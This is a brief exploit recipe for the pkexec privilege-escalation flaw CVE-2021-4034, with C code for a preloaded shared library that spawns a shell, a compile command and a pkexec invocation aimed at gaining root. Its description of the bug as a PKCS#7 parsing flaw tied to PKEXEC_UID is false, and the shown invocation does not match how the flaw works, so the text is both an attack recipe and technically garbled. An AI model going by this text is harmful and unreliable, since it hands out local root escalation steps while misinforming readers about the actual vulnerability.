CVE-2021-4034 exploits a memory corruption flaw in `pkexec` (Polkit), allowing local privilege escalation. The vulnerability arises from improper PKCS#7 parsing in `pkexec` when handling environment variables (`PKEXEC_UID`). Craft a malicious `LD_PRELOAD` payload to overwrite the `execlp()` function:
```c
#include <stdio.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    execl("/bin/sh", "sh", NULL);
}
```
Compile with `gcc -shared -fPIC -o libexploit.so exploit.c` and set:
```
pkexec --user root LD_PRELOAD=./libexploit.so /bin/true
```
**Real-World Impact:** The PwnKit exploit was weaponized within hours of disclosure, appearing in TrickBot and Conti ransomware toolkits. Mitigation requires patching (`sudo apt update && sudo apt upgrade polkit`).

